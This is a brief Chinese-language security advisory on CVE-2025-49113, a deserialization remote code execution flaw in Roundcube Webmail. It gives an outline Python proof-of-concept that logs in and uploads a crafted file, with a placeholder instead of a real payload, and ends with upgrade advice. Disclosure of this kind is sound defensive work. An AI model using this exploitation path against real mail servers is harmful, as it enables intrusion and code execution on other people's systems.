**严重程度：** Critical

**公开日期：** 2026-06-15

### 漏洞描述
CVE-2025-49113 是 Roundcube Webmail 的 PHP 对象反序列化 RCE 漏洞。upload.php 脚本在处理上传图片文件名时不安全地反序列化 PHP 对象，允许认证用户执行任意代码。

### POC/利用
```python
import requests

session = requests.Session()
# 1. 登录 Roundcube
login_data = {"_user": username, "_pass": password}
session.post(f"{target}/?_task=login", data=login_data)

# 2. 上传恶意文件触发反序列化
# 利用 Crypt_GPG_Engine 反序列化链
files = {"file[]": ("exploit.jpg", b"malicious_content", "image/jpeg")}
session.post(f"{target}/?_task=mail&_action=upload", files=files)
```

### 利用特点
- 需要认证（低权限用户即可）
- PHP 对象反序列化
- Crypt_GPG_Engine 链
- 影响大量邮件服务器

### 修复建议
1. 升级到 Roundcube 1.5.10 或 1.6.11
2. 限制文件上传功能
